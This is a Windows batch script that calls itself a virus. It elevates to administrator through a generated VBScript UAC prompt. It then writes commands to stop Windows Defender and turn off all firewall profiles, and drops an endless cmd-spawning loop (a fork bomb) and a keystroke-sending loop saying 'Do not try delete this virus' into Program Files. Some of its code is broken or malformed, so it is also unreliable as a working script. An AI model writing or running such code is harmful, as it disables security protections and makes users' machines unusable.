@echo off
setlocal

title %random% %date% %username% %time% %random%

:-------------------------------------
rem  --> Check for permissions
    if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

rem --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------    	




:check
echo This is extremely dangerous, answer [Y]es to countinue, [N]o to exit
echo.
set /p userControl = ">>"
if %userControl% == Y (
goto ExcCmd
) else (
set someOtherProgram=SomeOtherProgram.exe
TASKKILL /IM "%someOtherProgram%"
cls
del "%~f0"
)
:ExcCmd
echo net stop "Windows Defender Service"
echo net stop "Windows Firewall"
echo netsh firewall set opmode disable
echo netsh firewall set opmode mode=DISABLE
echo netsh advfirewall set currentprofile state off
echo netsh advfirewall set domainprofile state off
echo netsh advfirewall set privateprofile state off
echo netsh advfirewall set publicprofile state off
echo netsh advfirewall set allprofiles state off
cls
(
echo :L
echo start cmd
echo goto L
)>C:\Program Files\v01.bat

(
echo @if (@CodeSection == @Batch) @then
echo @echo off
echo set sk=CScript //nologo //E:JScript "%~F0"
echo start notepad.exe
echo TIMEOUT /t 1
echo %sk% Do not try delete this virus
echo :l
echo %sk% vr.exc(sc,dsk)
echo goto l
echo GOTO :EOF
echo.
echo @end
echo // JScript section
echo var WshShell = WScript.CreateObject("WScript.Shell");
echo WshShell.SendKeys(WScript.Arguments(0));0
)>C:\Program Files\v02.bat

(
echo start C:\Program Files\v01.bat
echo start C:\Program Files\v02.bat
)
